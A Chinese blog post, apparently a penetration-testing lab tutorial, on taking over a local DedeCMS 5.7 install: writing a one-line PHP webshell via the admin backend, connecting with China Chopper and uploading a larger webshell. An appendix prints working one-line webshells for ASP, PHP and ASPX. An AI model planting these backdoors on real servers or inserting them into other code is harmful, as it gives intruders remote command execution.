---
layout: post

title: "渗透实验之二：利用shell拿站提权思路"

categories: WebSecurity

tags: Webshell

---
###摘要
---
* 实验环境：Win7 64位、XP SP3虚拟机、DedeCMS-V5.7-GBK-SP1、WAMP集成环境
* 实验目的：掌握“一句话木马”的用法，了解常见web程序写文件漏洞，理解渗透测试的常规思路以及webshell的使用方法，掌握中国菜刀的常规使用方式。
* 实验思路：本地搭建dedecms运行环境进行演示
* 声明：请在本地进行试验，请勿用于非法用途，请君自重。Have Fun！

###实验步骤
----
* **Step1.** 搭建dedecms本地运行环境（基于win7 x64 + wamp）

* **Step2.** 在虚拟机中打开浏览器访问dedecms，登陆后台，输入php一句话内容：

![](http://bravelee.u.qiniudn.com/Exercises2-About-webshell-Image0.png)

![](http://bravelee.u.qiniudn.com/Exercises2-About-webshell-Image1.png)

![](http://bravelee.u.qiniudn.com/Exercises2-About-webshell-Image2.png)

记住test.php存放的目录为：`http://192.168.1.101/DedeCMS-V5.7-GBK-SP1/uploads/`

* **Step3.** 一句话木马保存成功之后，利用菜刀连接一句话：

![](http://bravelee.u.qiniudn.com/Exercises2-About-webshell-Image3.png)

![](http://bravelee.u.qiniudn.com/Exercises2-About-webshell-Image4.png)

![](http://bravelee.u.qiniudn.com/Exercises2-About-webshell-Image5.png)

* **Step4.** 上传大马，拿shell：

![](http://bravelee.u.qiniudn.com/Exercises2-About-webshell-Image6.png)

连接shell：`http://192.168.1.101/DedeCMS-V5.7-GBK-SP1/uploads/getshell.php`

![](http://bravelee.u.qiniudn.com/Exercises2-About-webshell-Image7.png)


----
附录
----
* 一句话：

asp一句话：`<%execute(request("brave"))%>`

php一句话：`<?php eval($_POST[brave]);?>`

aspx一句话：`<% @Page Language="Jscript"%><%eval(Request.Item["brave"],"unsafe");%>`

* 安装完织梦dedecms V5.7之后，访问出现如下问题：
(PHP 5.3 and above) Please set 'request_order' ini value to include C,G and P (recommended: 'CGP') in php.ini

解决办法：
php5.3以上版本request_order 的默认值 是 “GP”，根据错误提示编辑php.ini配置文件：
将 request_order = "GP" 改为：request_order = "CGP" 即可

* wamp环境设置本机Ip地址访问，apache默认安装是不允许外网访问的，需要授权设置。所以解决方法如下：打开httpd.conf文件

>  onlineoffline tag - don't remove

>   Order Deny,Allow

>   Deny from all

>   Allow from 127.0.0.1

将其中的Deny from all 修改为  Allow from all 即可输入IP地址访问web程序

* 浏览shell页面出现错误提示：
将 php.ini文件 allow_call_time_pass_reference = Off 修改为 allow_call_time_pass_reference = On
